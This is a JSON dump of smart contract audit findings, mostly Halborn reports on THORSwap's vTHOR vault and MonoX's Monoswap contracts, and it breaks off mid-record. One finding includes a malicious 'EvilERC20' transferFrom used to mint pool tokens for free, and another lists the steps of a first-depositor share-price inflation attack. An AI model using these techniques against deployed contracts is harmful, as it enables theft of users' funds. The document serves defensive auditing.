{
  "category": "Leveraged Farming",
  "total_findings": 1207,
  "fetched_at": "2026-01-29T13:44:05Z",
  "findings": [
    {
      "id": "50475",
      "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
      "impact": "LOW",
      "content": "##### Description\n\nIn the `Owners` and `TSAggregator` contracts there are management functions marked as public, but they are never directly called within the contract itself or in any of its descendants:\n\n* `setOwner(address owner, bool active) public virtual isOwner` (Owners.sol#19)\n* `setFee(uint256 _fee, address _feeRecipient) public` (TSAggregator.sol#26)\n\n##### Score\n\nImpact: 1  \nLikelihood: 1\n\n##### Recommendation\n\n**SOLVED**: The `THORSwap team` marked the `setOwner` and `setFee` functions as `external`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "THORSwap Aggregators",
      "source_link": "https://www.halborn.com/audits/thorswap/thorswap-aggregators-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50474",
      "title": "MISSING RE-ENTRANCY PROTECTION",
      "impact": "LOW",
      "content": "##### Description\n\nThe `vTHOR` contract missed the nonReentrant guard in the `deposit`, `mint`, `withdraw` and `redeem` public functions. Even if the functions follow the check-effects-interactions pattern, we recommend using a mutex to be protected against cross-function reentrancy attacks. By using this lock, an attacker can no longer exploit the function with a recursive call.\n\nNote that the `vTHOR` contract included a mutex implementation called `ReentrancyGuard`, which provides a modifier to any function called `nonReentrant` that guards with a mutex against reentrancy attacks. However, the modifier is not used within the contract.\n\nCode Location\n-------------\n\n#### vTHOR.sol\n\n```\nfunction deposit(uint256 assets, address receiver) public returns (uint256 shares) {\n    // Check for rounding error since we round down in previewDeposit.\n    require((shares = previewDeposit(assets)) != 0, \"ZERO_SHARES\");\n    // Need to transfer before minting or ERC777s could reenter.\n    address(_asset).safeTransferFrom(msg.sender, address(this), assets);\n    _mint(receiver, shares);\n    emit Deposit(msg.sender, receiver, assets, shares);\n}\n\nfunction mint(uint256 shares, address receiver) public returns (uint256 assets) {\n    assets = previewMint(shares); // No need to check for rounding error, previewMint rounds up.\n    // Need to transfer before minting or ERC777s could reenter.\n    address(_asset).safeTransferFrom(msg.sender, address(this), assets);\n    _mint(receiver, shares);\n    emit Deposit(msg.sender, receiver, assets, shares);\n}\n\nfunction withdraw(\n    uint256 assets,\n    address receiver,\n    address owner\n) public returns (uint256 shares) {\n    shares = previewWithdraw(assets); // No need to check for rounding error, previewWithdraw rounds up.\n    if (msg.sender != owner) {\n        uint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.\n        if (allowed != type(uint256).max) allowance[owner][msg.sender] = allowed - shares;\n    }\n    _burn(owner, shares);\n    emit Withdraw(msg.sender, receiver, owner, assets, shares);\n    address(_asset).safeTransfer(receiver, assets);\n}\n\nfunction redeem(\n    uint256 shares,\n    address receiver,\n    address owner\n) public returns (uint256 assets) {\n    if (msg.sender != owner) {\n        uint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.\n        if (allowed != type(uint256).max) allowance[owner][msg.sender] = allowed - shares;\n    }\n    // Check for rounding error since we round down in previewRedeem.\n    require((assets = previewRedeem(shares)) != 0, \"ZERO_ASSETS\");\n    _burn(owner, shares);\n    emit Withdraw(msg.sender, receiver, owner, assets, shares);\n    address(_asset).safeTransfer(receiver, assets);\n}\n\n```\n\n##### Score\n\nImpact: 3  \nLikelihood: 1\n\n##### Recommendation\n\n**SOLVED**: The `THORSwap team` added the `nonReentrant` modifier to the `deposit`, `mint`, `withdraw` and `redeem` functions.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "THORSwap Aggregators",
      "source_link": "https://www.halborn.com/audits/thorswap/thorswap-aggregators-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50473",
      "title": "INITIAL vTHOR SHARE PRICE MANIPULATION EXPOSURE",
      "impact": "LOW",
      "content": "##### Description\n\nAfter deployment, the `vTHOR` contract is initialed without seeding liquidity, exposing the vault to share price manipulation attacks.\n\n1. The `vTHOR` contract is deployed by the THORSwap team.\n2. An attacker finds the `vTHOR` contract before anyone can deposit their tokens.\n3. The attacker deposits 1 token, for which they receive 1 share. This transaction sets the share price at 1 token/share.\n4. The attacker then transfers an additional 999 tokens to the `vTHOR` contract. This transaction increases the share price to 1000 tokens/share.\n5. A victim user finds the `vTHOR` contract and deposits 1500 tokens. Due to the integer rounding, the user only receives 1 share. This transaction modifies the share price to 1250 tokens/share.\n6. The attacker then, withdraws from the contract using the redeem function. Depending on the distribution of shares, they will receive 1250 tokens, of which 250 will belong to the victim user.\n\nWe note that the impact and likelihood of the vulnerability are low because the attacker has limited opportunity to exploit the issue. However, contract developers must be aware of the initial exposure to prevent potential damage.\n\n##### Score\n\nImpact: 3  \nLikelihood: 1\n\n##### Recommendation\n\n**RISK ACCEPTED**: The `THORSwap team` accept the risk of this finding and will deploy `vTHOR` and deposit THOR from treasury first to mitigate the issue.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "THORSwap Aggregators",
      "source_link": "https://www.halborn.com/audits/thorswap/thorswap-aggregators-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50187",
      "title": "IMPRECISION OF A CONSTANT",
      "impact": "LOW",
      "content": "##### Description\n\nDuring the audit, it has been observed that integers with scientific notations are directly compared with function arguments.\n\nCode Location\n-------------\n\n#### Monoswap.sol\n\n```\nfunction setFees (uint16 _fees) onlyOwner external {\n    require(_fees<1e3, \"fees too large\");\n    fees = _fees;\n}\n\nfunction setDevFee (uint16 _devFee) onlyOwner external {\n    require(_devFee<1e3, \"devFee too large\");\n    devFee = _devFee;\n}\n\n```\n\n#### Monoswap.sol\n\n```\nfunction _mintFee (uint256 pid, uint256 lastPoolValue, uint256 newPoolValue) internal {\n\n    uint256 _totalSupply = monoXPool.totalSupplyOf(pid);\n    if(newPoolValue>lastPoolValue && lastPoolValue>0) {\n      // safe ops, since newPoolValue>lastPoolValue\n      uint256 deltaPoolValue = newPoolValue - lastPoolValue; \n\n      // safe ops, since newPoolValue = deltaPoolValue + lastPoolValue > deltaPoolValue\n      uint256 devLiquidity = _totalSupply.mul(deltaPoolValue).mul(devFee).div(newPoolValue-deltaPoolValue)/1e5;\n      monoXPool.mint(feeTo, pid, devLiquidity);\n    }\n\n}\n\n```\n\nAlso lines `#584` and `#638` in `Monoswap.sol`.\n\n#### Monoswap.sol\n\n```\nfunction getPool (address _token) view public returns (uint256 poolValue, \n    uint256 tokenBalanceVusdValue, uint256 vusdCredit, uint256 vusdDebt) {\n    PoolInfo memory pool = pools[_token];\n    vusdCredit = pool.vusdCredit;\n    vusdDebt = pool.vusdDebt;\n    tokenBalanceVusdValue = uint(pool.price).mul(pool.tokenBalance)/1e18;\n\n    poolValue = tokenBalanceVusdValue.add(vusdCredit).sub(vusdDebt);\n}\n\n```\n\nAlso lines `#258`, `#297`, `#322`, `#326`, `#569`, `#570`, `#590`, `#600`, `#605`, `#614`, `#628`, `#645`, `#656`, `#661`, `#671`, `#684`, `#715` and `#767` in `Monoswap.sol`.\n\n#### MonoswapStaking.sol\n\n```\nfunction initialize(\n        MonoToken _mono,\n        uint256 _monoPerPeriod,\n        uint256 _blockPerPeriod,\n        uint256 _decay\n    ) public initializer {\n        OwnableUpgradeable.__Ownable_init();\n        __ERC1155Holder_init();\n        mono = _mono;\n        monoPerPeriod = _monoPerPeriod;\n        blockPerPeriod = _blockPerPeriod;\n        decay = _decay;\n        startBlock = block.number;\n        currentPeriod = 0;\n        ratios[currentPeriod] = 1e12;\n        totalAllocPoint = 0;\n}\n\n```\n\nAlso lines `#176`, `#185`, `#211`, `#221`, `#232`, `#265`, `#297`, `#299`, `#316`, `#317`, `#336`, `#337`, `#359`, `#377`, `#378` and `#389` in `MonoswapStaking.sol`.\n\n##### Score\n\nImpact: 1  \nLikelihood: 1\n\n##### Recommendation\n\n**ACKNOWLEDGED**: MonoX refrain from introducing extra variables as it increases the contract size quite a bit and increase gas usage as well. Therefore they are trying not to have a variable unless it's necessary.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "MonoX",
      "source_link": "https://www.halborn.com/audits/monox/monox-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50186",
      "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
      "impact": "LOW",
      "content": "##### Description\n\nIn public functions, array arguments are immediately copied to memory, while external functions can read directly from `calldata`. Reading `calldata` is cheaper than memory allocation. Public functions need to write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function.\nAlso, methods do not necessarily have to be public if they are only called within the contract-in such case they should be marked `internal`.\n\nCode Location\n-------------\n\n#### Monoswap.sol\n\n```\nfunction updatePoolStatus(address _token, PoolStatus _status) public onlyOwner {\n    PoolInfo storage pool = pools[_token];\n    pool.status = _status;\n}\n\n```\n\n#### Monoswap.sol\n\n```\nfunction updatePoolPrice(address _token, uint112 _newPrice) public onlyOwner {\n    require(_newPrice > 0, 'Monoswap: zeroPriceNotAccept');\n    require(tokenPoolStatus[_token] != 0, \"Monoswap: PoolNotExist\");\n\n    PoolInfo storage pool = pools[_token];\n\n```\n\n#### Monoswap.sol\n\n```\nfunction listNewToken (address _token, uint112 _price, \n    uint256 vusdAmount, \n    uint256 tokenAmount,\n    address to) public returns(uint _pid, uint256 liquidity) {\n    _pid = _createPool(_token, _price, PoolStatus.LISTED);\n    liquidity = addLiquidityPair(_token, vusdAmount, tokenAmount, to);\n  }\n}\n\n```\n\n#### MonoswapStaking.sol\n\n```\nfunction set(\n    uint256 _pid,\n    uint256 _allocPoint,\n    bool _withUpdate\n) public onlyOwner {\n    if (_withUpdate) {\n        massUpdatePools();\n    }\n\n```\n\n#### MonoswapStaking.sol\n\n```\nfunction stopPool(uint256 _pid) public onlyOwner {\n    updatePool(_pid);\n\n```\n\n#### MonoswapStaking.sol\n\n```\nfunction migratePool(uint256 _oldPid, uint256 _newPid) public {\n    PoolInfo storage oldPool = poolInfo[_oldPid];\n    PoolInfo storage newPool = poolInfo[_newPid];\n\n```\n\n#### MonoswapStaking.sol\n\n```\nfunction deposit(uint256 _pid, uint256 _amount) public {\n    PoolInfo storage pool = poolInfo[_pid];\n    UserInfo storage user = userInfo[_pid][msg.sender];\n\n```\n\n#### MonoswapStaking.sol\n\n```\nfunction withdraw(uint256 _pid, uint256 _amount) public {\n    PoolInfo storage pool = poolInfo[_pid];\n    UserInfo storage user = userInfo[_pid][msg.sender];\n\n```\n\n#### MonoswapStaking.sol\n\n```\nfunction emergencyWithdraw(uint256 _pid) public {\n    PoolInfo storage pool = poolInfo[_pid];\n    UserInfo storage user = userInfo[_pid][msg.sender];\n\n```\n\n##### Score\n\nImpact: 1  \nLikelihood: 1",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "MonoX",
      "source_link": "https://www.halborn.com/audits/monox/monox-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50185",
      "title": "INTEGER OVERFLOW",
      "impact": "MEDIUM",
      "content": "##### Description\n\nAn overflow happens when an arithmetic operation reaches the maximum size of a type. For instance, in `Monoswap.sol`, the `getAmountOut` method is subtracting `fees` from a fixed number and may end up overflowing the integer since the resulting value is not checked to be greater or equal 0. In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits â€“ either larger than the maximum or lower than the minimum representable value.\n\nCode Location\n-------------\n\n#### Monoswap.sol\n\n```\nfunction getAmountOut(address tokenIn, address tokenOut, \n    uint256 amountIn) public view returns (uint256 tokenInPrice, uint256 tokenOutPrice, \n    uint256 amountOut, uint256 tradeVusdValue) {\n    require(amountIn > 0, 'Monoswap: INSUFFICIENT_INPUT_AMOUNT');\n\n    uint256 amountInWithFee = amountIn.mul(1e5-fees)/1e5;\n    address vusdAddress = address(vUSD);\n\n```\n\n#### Monoswap.sol\n\n```\nfunction getAmountIn(address tokenIn, address tokenOut, \n    uint256 amountOut) public view returns (uint256 tokenInPrice, uint256 tokenOutPrice, \n    uint256 amountIn, uint256 tradeVusdValue) {\n    require(amountOut > 0, 'Monoswap: INSUFFICIENT_INPUT_AMOUNT');\n\n    uint256 amountOutWithFee = amountOut.mul(1e5+fees)/1e5;\n    address vusdAddress = address(vUSD);\n\n```\n\n##### Score\n\nImpact: 3  \nLikelihood: 3\n\n##### Recommendation\n\n**SOLVED**: MonoX is certain the integers reported will not overflow since the `fees` variable cannot be assigned value greater than `1e3`.",
      "summary": "\nThe report describes a bug where an arithmetic operation in the `Monoswap.sol` code may cause an integer overflow. This happens when the result of the operation is larger than the maximum or lower than the minimum value that can be represented by the computer. The code location of the bug is in the `getAmountOut` and `getAmountIn` functions. The impact of this bug is rated 3 out of 5, and the likelihood of it occurring is also rated 3 out of 5. The recommendation is to solve the bug by ensuring that the `fees` variable cannot be assigned a value greater than `1e3`.",
      "quality_score": 5,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "MonoX",
      "source_link": "https://www.halborn.com/audits/monox/monox-smart-contract-security-assessment",
      "github_link": "",
      "tags": [
        "Overflow/Underflow"
      ],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50184",
      "title": "TAUTOLOGY EXPRESSIONS",
      "impact": "LOW",
      "content": "##### Description\n\nIn contract `Monoswap.sol`, tautology expressions have been detected. Such expressions are of no use since they always evaluate true/false regardless of the context they are used in.\n\nCode Location\n-------------\n\n#### Monoswap.sol\n\n```\nif(_poolStatus == PoolStatus.LISTED){\n\n      require (_vusdCredit>=0 && _vusdDebt==0, \"Monoswap: unofficial pool cannot bear debt\");\n}\n\n```\n\n##### Score\n\nImpact: 2  \nLikelihood: 2\n\n##### Recommendation\n\n**SOLVED**: Tautology Expression was removed in commit #635a4cee2f2e50d854e06cac47c48aa0fafde2b0.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "MonoX",
      "source_link": "https://www.halborn.com/audits/monox/monox-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50183",
      "title": "ADDRESS VALIDATION MISSING",
      "impact": "LOW",
      "content": "##### Description\n\nAddress validation is missing in multiple functions in contracts `Monoswap.sol` and `MonoXPool.sol`. This may result with users irreversibly locking their tokens when incorrect address is provided.\n\nCode Location\n-------------\n\n#### Monoswap.sol\n\n```\nfunction mint (address account, uint256 id, uint256 amount) internal {\n    monoXPool.mint(account, id, amount);\n}\n\nfunction burn (address account, uint256 id, uint256 amount) internal {\n    monoXPool.burn(account, id, amount);\n}\n\n```\n\n#### MonoXPool.sol\n\n```\nconstructor (address _WETH) {\n      WETH = _WETH;\n}\n\n```\n\n#### MonoXPool.sol\n\n```\nfunction mint (address account, uint256 id, uint256 amount) public onlyOwner {\n    totalSupply[id]=totalSupply[id].add(amount);\n    _mint(account, id, amount, \"\");\n}\n\nfunction burn (address account, uint256 id, uint256 amount) public onlyOwner {\n    totalSupply[id]=totalSupply[id].sub(amount);\n    _burn(account, id, amount);\n}\n\n```\n\n##### Score\n\nImpact: 2  \nLikelihood: 2\n\n##### Recommendation\n\n**PARTIALLY SOLVED**: Vulnerable function calls in `Monoswap.sol` have been removed but address validation is missing in `MonoXPool.sol`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "MonoX",
      "source_link": "https://www.halborn.com/audits/monox/monox-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50182",
      "title": "ROLE-BASED ACCESS CONTROL MISSING",
      "impact": "HIGH",
      "content": "##### Description\n\nIn smart contracts, implementing a correct Access Control policy is an essential step to maintain security and decentralization for permissions on a token. All the features of the smart contract , such as mint/burn tokens and pause contracts are given by Access Control. For instance, Ownership is the most common form of Access Control. In other words, the owner of a contract (the account that deployed it by default) can do some administrative tasks on it. Nevertheless, other authorization levels are required to follow the principle of least privilege, also known as least authority. Briefly, any process, user or program only can access to the necessary resources or information. Otherwise, the ownership role is useful in a simple system, but more complex projects require the use of more roles by using Role-based access control.\n\nCode Location\n-------------\n\n#### Monoswap.sol\n\n```\nfunction setFeeTo (address _feeTo) onlyOwner external {\n    feeTo = _feeTo;\n}\n\nfunction setFees (uint16 _fees) onlyOwner external {\n    require(_fees<1e3, \"fees too large\");\n    fees = _fees;\n}\n\nfunction setDevFee (uint16 _devFee) onlyOwner external {\n    require(_devFee<1e3, \"devFee too large\");\n    devFee = _devFee;\n}\n\n// update status of a pool. onlyOwner.\nfunction updatePoolStatus(address _token, PoolStatus _status) public onlyOwner {\n    PoolInfo storage pool = pools[_token];\n    pool.status = _status;\n}\n\n/**\n @dev update pools price if there were no active trading for the last 6000 blocks\n @notice Only owner callable, new price can neither be 0 nor be equal to old one\n @param _token pool identifider (token address)\n @param _newPrice new price in wei (uint112)\n*/\nfunction updatePoolPrice(address _token, uint112 _newPrice) public onlyOwner {\n    require(_newPrice > 0, 'Monoswap: zeroPriceNotAccept');\n\n```\n\n##### Score\n\nImpact: 4  \nLikelihood: 4\n\n##### Recommendation\n\n**SOLVED**: Fixed in commit #635a4cee2f2e50d854e06cac47c48aa0fafde2b0. Several new roles were introduced.",
      "summary": "\nThe report highlights a bug in a smart contract called Monoswap.sol. This contract is used for accessing and managing tokens. The bug relates to the Access Control policy, which is important for maintaining security and decentralization in the contract. The code for the contract is given, and the bug is identified in the function \"updatePoolPrice\". The bug allows anyone to update the pool price, instead of just the owner. This can lead to unauthorized changes in the contract and compromise its security. The bug has been given a score of 4 for impact and likelihood, indicating that it is a significant issue that needs to be addressed. The recommendation for fixing the bug is to introduce new roles in the contract, which has been done in a recent update.",
      "quality_score": 4,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "MonoX",
      "source_link": "https://www.halborn.com/audits/monox/monox-smart-contract-security-assessment",
      "github_link": "",
      "tags": [
        "Access Control"
      ],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50181",
      "title": "POOL BLOCKING",
      "impact": "HIGH",
      "content": "##### Description\n\nOne of MonoX's main objectives is to allow users for listing ERC20 tokens without the need for providing liquidity. Users can set arbitrary prices for tokens they list because the `Monoswap.sol` contract does not verify them against third-party data sources. The price of a given token can be updated only if it has not been swapped for at least `6000` blocks since the last exchange. In consequence, since the contract does not enforce `minimum or maximum transaction amount`, a malicious user can list tokens, price them way above market rate and keep the price on that level by doing microexchanges once every 6000 blocks thus effectively DoSing the pool.\n\nCode Location\n-------------\n\n#### Monoswap.sol\n\n```\nfunction listNewToken (address _token, uint112 _price, \n    uint256 vusdAmount, \n    uint256 tokenAmount,\n    address to) public returns(uint _pid, uint256 liquidity) {\n    _pid = _createPool(_token, _price, PoolStatus.LISTED);\n    liquidity = addLiquidityPair(_token, vusdAmount, tokenAmount, to);\n}\n\n```\n\n#### Monoswap.sol\n\n```\nfunction _createPool (address _token, uint112 _price, PoolStatus _status) lock internal returns(uint256 _pid)  {\n    require(tokenPoolStatus[_token]==0, \"Monoswap: Token Exists\");\n    require (_token != address(vUSD), \"Monoswap: vUSD pool not allowed\");\n    _pid = poolSize;\n    pools[_token] = PoolInfo({\n      token: _token,\n      pid: _pid,\n      vusdCredit: 0,\n      vusdDebt: 0,\n      tokenBalance: 0,\n      lastPoolValue: 0,\n      status: _status,\n      price: _price\n    });\n\n    poolSize = _pid.add(1);\n    tokenPoolStatus[_token]=1;\n\n    // initialze pool's lasttradingblocknumber as the block number on which the pool is created\n    lastTradedBlock[_token] = block.number;\n}\n\n```\n\n#### Monoswap.sol\n\n```\nfunction swapExactTokenForToken(\n    address tokenIn,\n    address tokenOut,\n    uint amountIn,\n    uint amountOutMin,\n    address to,\n    uint deadline\n  ) external virtual ensure(deadline) returns (uint amountOut) {\n    amountOut = swapIn(tokenIn, tokenOut, msg.sender, to, amountIn);\n    require(amountOut >= amountOutMin, 'Monoswap: INSUFFICIENT_OUTPUT_AMOUNT');\n}\n\n```\n\n#### Monoswap.sol\n\n```\n    // record last trade's block number in mapping: lastTradedBlock\n    lastTradedBlock[_token] = block.number;\n\n```\n\n#### Monoswap.sol\n\n```\nfunction updatePoolPrice(address _token, uint112 _newPrice) public onlyOwner {\n    require(_newPrice > 0, 'Monoswap: zeroPriceNotAccept');\n    require(tokenPoolStatus[_token] != 0, \"Monoswap: PoolNotExist\");\n\n    PoolInfo storage pool = pools[_token];\n    require(pool.price != _newPrice, \"Monoswap: SamePriceNotAccept\");\n\n    require(block.number > lastTradedBlock[_token].add(6000), \"Monoswap: PoolPriceUpdateLocked\");\n    pool.price = _newPrice;\n    lastTradedBlock[_token] = block.number;\n}\n\n```\n\n##### Score\n\nImpact: 4  \nLikelihood: 4\n\n##### Recommendation\n\n**SOLVED**: Fixed in commit #635a4cee2f2e50d854e06cac47c48aa0fafde2b0. Contract owner can now pause pools and temporarily disable swapping so that users with the `PriceAdjuster` role (assigned by the contract owner) can update prices.",
      "summary": "\nThe MonoX platform allows users to list ERC20 tokens without having to provide liquidity. However, there is a bug in the `Monoswap.sol` contract that allows malicious users to list tokens at inflated prices and keep them at that level by doing small exchanges every 6000 blocks. This can effectively disrupt the pool and prevent other users from making trades. The bug is located in the `listNewToken` and `_createPool` functions, which do not verify the prices set by users against external data sources. This allows for the creation of pools with unrealistic prices. Additionally, the `swapExactTokenForToken` function, which is used to make exchanges, does not have a minimum or maximum transaction amount, making it easier for malicious users to manipulate the price. The impact and likelihood of this bug are both rated as 4 out of 5. The recommendation is to update the contract to allow the contract owner to pause pools and temporarily disable swapping so that users with the `PriceAdjuster` role can update prices. This bug has been fixed in a recent commit.",
      "quality_score": 3,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "MonoX",
      "source_link": "https://www.halborn.com/audits/monox/monox-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50180",
      "title": "UNRESTRICTED POOL TOKEN MINTING",
      "impact": "HIGH",
      "content": "##### Description\n\nOne of MonoX's main objectives is to allow users for listing ERC20 tokens without the need for providing liquidity. In order to keep track of users' shares in pools, a corresponding amount of liquidity pool tokens is minted to providers. The exact amount to be minted depends on e.g. the `declared` amount of ERC20 tokens added to the pool and the token price, intially set by the provider.\n\nIn the `addLiquidityPair` function MonoX use OpenZeppelin's `safeTransferFrom` to handle the token transfer. This function calls `transferFrom` in the token contract to actually execute the transfer. However, since the actual amount transferred ie. the delta of previous (before transfer) and current (after transfer) balance is not verified, a malicious user may list a custom ERC20 token with the `transferFrom` function modified in such a way that it e.g. does not transfer any tokens at all and the attacker is still going to have their liquidity pool tokens minted anyway.\n\nCode Location\n-------------\n\n`Attacker-controlled example ERC20 token contract`\n\n#### EvilERC20.sol\n\n```\nfunction transferFrom(\n    address from,\n    address to,\n    uint256 value\n  )\n    public\n    override\n    returns (bool)\n  {\n    value = 1;\n    require(value <= _balances[from]);\n    require(value <= _allowed[from][msg.sender]);\n    require(to != address(0));\n\n    _balances[from] = _balances[from].sub(value);\n    _balances[to] = _balances[to].add(value);\n    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);\n    emit Transfer(from, to, value);\n    return true;\n  }\n\n```\n\n`MonoX`\n\n#### Monoswap.sol\n\n```\nfunction listNewToken (address _token, uint112 _price, \n    uint256 vusdAmount, \n    uint256 tokenAmount,\n    address to) public returns(uint _pid, uint256 liquidity) {\n    _pid = _createPool(_token, _price, PoolStatus.LISTED);\n    liquidity = addLiquidityPair(_token, vusdAmount, tokenAmount, to);\n}\n\n```\n\n#### Monoswap.sol\n\n```\n    _mintFee(pool.pid, pool.lastPoolValue, poolValue);\n    uint256 _totalSupply = monoXPool.totalSupplyOf(pool.pid);\n    IERC20(_token).safeTransferFrom(msg.sender, address(monoXPool), tokenAmount);\n    if(vusdAmount>0){\n      vUSD.safeTransferFrom(msg.sender, address(monoXPool), vusdAmount);\n    }\n\n    uint256 liquidityVusdValue = vusdAmount.add(tokenAmount.mul(pool.price)/1e18);\n\n    if(_totalSupply==0){\n      liquidity = liquidityVusdValue.sub(MINIMUM_LIQUIDITY);\n      mint(owner(), pool.pid, MINIMUM_LIQUIDITY); // sorry, oz doesn't allow minting to address(0)\n    }else{\n      liquidity = _totalSupply.mul(liquidityVusdValue).div(poolValue);\n    }\n\n    mint(to, pool.pid, liquidity);\n}\n\n```\n\n`OpenZeppelin`\n\n#### SafeERC20.sol\n\n```\nlibrary SafeERC20 {\n    using Address for address;\n\n    function safeTransfer(IERC20 token, address to, uint256 value) internal {\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\n    }\n\n    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\n    }\n\n```\n\n##### Score\n\nImpact: 4  \nLikelihood: 4\n\n##### Recommendation\n\n**SOLVED**: Fixed in commit #635a4cee2f2e50d854e06cac47c48aa0fafde2b0. The amount to be minted is calculated now based on the delta of account balance before and after transfer.",
      "summary": "\nThe MonoX platform allows users to list ERC20 tokens without needing to provide liquidity. However, there is a bug in the code that allows malicious users to list a custom ERC20 token and still have their liquidity pool tokens minted, even if the token transfer is not executed properly. This is because the code does not verify the actual amount of tokens transferred. This bug has a high impact and likelihood of occurring. It has been fixed in the latest commit by calculating the minted amount based on the difference in account balance before and after the transfer.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "MonoX",
      "source_link": "https://www.halborn.com/audits/monox/monox-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50179",
      "title": "DIVIDE BEFORE MULTIPLY",
      "impact": "LOW",
      "content": "##### Description\n\nSolidity integer division might truncate. As a result, performing multiplication before division can sometimes avoid loss of precision. In this audit, there are multiple instances found where division is being performed before multiplication operation in contract file.\n\nCode Location\n-------------\n\n#### MonoswapStaking.sol\n\n```\nif (user.oldReward > 0) {\n    monoReward = monoReward.add(user.oldReward.mul(stakedAmount).div(user.amount).mul(1e12));\n}\n\n```\n\n##### Score\n\nImpact: 3  \nLikelihood: 2\n\n##### Recommendation\n\n**SOLVED**: fixed in commit [#ac21bee3f7f1d7df3529907b0afb0470b0236d07](https://github.com/qntism/monoswap-staking-jack/commit/ac21bee3f7f1d7df3529907b0afb0470b0236d07)",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "MonoX",
      "source_link": "https://www.halborn.com/audits/monox/monox-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50178",
      "title": "EXTERNAL FUNCTION CALLS WITHIN LOOP",
      "impact": "LOW",
      "content": "##### Description\n\nCalls inside a loop might lead to a denial-of-service attack. In on of the functions discovered there is a for loop on variable `pid` that iterates up to the `poolInfo` array length. If this integer is evaluated at extremely large numbers this can cause a DoS.\n\nCode Location\n-------------\n\n#### MonoswapStaking.sol\n\n```\nfunction massUpdatePools() public {\n    uint256 length = poolInfo.length;\n    for (uint256 pid = 0; pid < length; ++pid) {\n        PoolInfo storage pool = poolInfo[pid];\n        if (pool.bActive)\n            updatePool(pid);\n    }\n}\n\n```\n\n##### Score\n\nImpact: 3  \nLikelihood: 2\n\n##### Recommendation\n\n**SOLVED**: MonoX is certain the DoS scenario is highly unlikely here since all external calls in this loop are made to MonoX-controlled contracts.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "MonoX",
      "source_link": "https://www.halborn.com/audits/monox/monox-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50177",
      "title": "USE OF BLOCK.TIMESTAMP",
      "impact": "LOW",
      "content": "##### Description\n\n`block.timestamp` can be influenced by miners to a certain degree, so the testers should be warned that this may have some risk if miners collude on time manipulation to influence the price oracles.\n\nCode Location\n-------------\n\n#### Monoswap.sol\n\n```\nmodifier ensure(uint deadline) {\n    require(deadline >= block.timestamp, 'Monoswap: EXPIRED');\n    _;\n}  \n\n```\n\n##### Score\n\nImpact: 4  \nLikelihood: 1\n\n##### Recommendation\n\n**SOLVED**: MonoX does not require timestamps to be extremely precise here (timescales are greater than 900 seconds)",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "MonoX",
      "source_link": "https://www.halborn.com/audits/monox/monox-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "31358",
      "title": "Change `ROUSG::unwrap` to return amount of `OUSG` output tokens then use that as input when calling `_redeem` in `OUSGInstantManager::redeemRebasingOUSG`",
      "impact": "GAS",
